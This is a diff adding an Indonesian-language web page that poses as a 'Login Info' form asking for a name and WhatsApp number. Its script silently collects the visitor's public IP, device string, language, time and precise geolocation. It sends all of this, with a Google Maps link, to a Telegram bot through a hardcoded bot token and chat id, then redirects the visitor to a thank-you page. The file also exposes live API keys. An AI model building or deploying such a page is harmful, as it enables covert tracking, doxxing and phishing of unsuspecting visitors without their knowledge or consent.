@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Info</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 300px;
+      animation: fadeIn 0.7s ease;
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #00ff88;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .back-btn {
+      margin-top: 10px;
+      font-size: 12px;
+      background: none;
+      border: none;
+      color: #ccc;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    #loading {
+      display: none;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="popup" id="step1">
+    <h2>Masukkan Nama Anda</h2>
+    <input type="text" id="nama" placeholder="Nama Anda">
+    <button onclick="lanjutKeNomor()">Lanjut</button>
+  </div>
+
+  <div class="popup" id="step2" style="display:none;">
+    <h2>Masukkan Nomor WhatsApp ADMIN</h2>
+    <input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
+    <button onclick="kirimData()">Kirim</button>
+    <button class="back-btn" onclick="kembali()">Kembali</button>
+  </div>
+
+  <div id="loading">
+    <h3>TOLONG........</h3>
+    <p>Tunggu sebentar ya...</p>
+  </div>
+
+  <script>
+    let namaGlobal = "";
+    let ipPublic = "Tidak diketahui";
+
+    // Ambil IP publik
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => ipPublic = data.ip)
+      .catch(() => ipPublic = "Gagal ambil IP");
+
+    function lanjutKeNomor() {
+      const nama = document.getElementById("nama").value.trim();
+      if (!nama) return alert("Masukkan nama dulu!");
+      namaGlobal = nama;
+
+      // Suara sapaan
+      try {
+        const ucapan = new SpeechSynthesisUtterance(`Halo, ${nama}`);
+        ucapan.lang = 'id-ID';
+        window.speechSynthesis.speak(ucapan);
+      } catch (e) {
+        console.warn("Gagal menyuarakan sapaan:", e);
+      }
+
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+    }
+
+    function kembali() {
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("step1").style.display = "block";
+    }
+
+    function kirimData() {
+      const whatsapp = document.getElementById("whatsapp").value.trim();
+      if (!whatsapp) return alert("Masukkan nomor WhatsApp!");
+
+      // Tampilkan loading
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("loading").style.display = "block";
+
+      const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
+      const chat_id = '6374002294';
+      const device = navigator.userAgent;
+      const lang = navigator.language;
+      const time = new Date();
+      const hari = new Intl.DateTimeFormat('id-ID', { weekday: 'long' }).format(time);
+
+      function kirimPesan(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chat_id, text: text })
+        });
+      }
+
+      function formatPesan(lat, lon, cuaca) {
+        return `INFORMASI DATA BY @Rizkuwae666_bot\n||=====================================||\n|| Nama: ${namaGlobal} ||\n|| Nomor WhatsApp: ${whatsapp} ||\n|| IP: ${ipPublic} ||\n|| Perangkat: ${device} ||\n|| Bahasa: ${lang} ||\n|| Waktu: ${time.toLocaleString('id-ID')} ||\n|| Hari: ${hari} ||\n|| Lokasi: https://www.google.com/maps?q=${lat},${lon} ||\n|| Cuaca: ${cuaca} ||\n=======================================`;
+      }
+
+      function ambilCuaca(lat, lon) {
+        fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=8f0d23b4d2d3b10e7c58ad1d4e1687b7&units=metric`)
+          .then(res => res.json())
+          .then(data => {
+            let deskripsi = data.weather[0].description.toLowerCase();
+            const suhu = data.main.temp;
+
+            const cuacaMap = {
+              "clear sky": "Langit cerah",
+              "few clouds": "Sedikit berawan",
+              "scattered clouds": "Berawan ringan",
+              "broken clouds": "Berawan tebal",
+              "overcast clouds": "Mendung",
+              "light rain": "Hujan ringan",
+              "moderate rain": "Hujan sedang",
+              "heavy intensity rain": "Hujan deras",
+              "thunderstorm": "Badai petir",
+              "snow": "Salju",
+              "mist": "Berkabut"
+            };
+            const deskripsiIndo = cuacaMap[deskripsi] || deskripsi;
+
+            const cuaca = `${deskripsiIndo}, ${suhu}°C`;
+            kirimPesan(formatPesan(lat, lon, cuaca));
+
+            // Redirect setelah 3 detik
+            setTimeout(() => window.location.href = "thanks.html", 3000);
+          })
+          .catch(() => {
+            kirimPesan(formatPesan(lat, lon, "Gagal ambil cuaca"));
+            setTimeout(() => window.location.href = "thanks.html", 3000);
+          });
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          ambilCuaca(lat, lon);
+        }, () => {
+          kirimPesan(`Nama: ${namaGlobal}\nNomor WhatsApp: ${whatsapp}\nIP: ${ipPublic}\nPerangkat: ${device}\nBahasa: ${lang}\nWaktu: ${time.toLocaleString('id-ID')}\nHari: ${hari}\nLokasi: Tidak diketahui\nCuaca: Tidak diketahui`);
+          setTimeout(() => window.location.href = "thanks.html", 3000);
+        });
+      } else {
+        kirimPesan(`Nama: ${namaGlobal}\nNomor WhatsApp: ${whatsapp}\nIP: ${ipPublic}\nPerangkat: ${device}\nBahasa: ${lang}\nWaktu: ${time.toLocaleString('id-ID')}\nHari: ${hari}\nLokasi: Tidak tersedia\nCuaca: Tidak tersedia`);
+        setTimeout(() => window.location.href = "thanks.html", 3000);
+      }
+    }
+  </script>
+</body>
+</html>
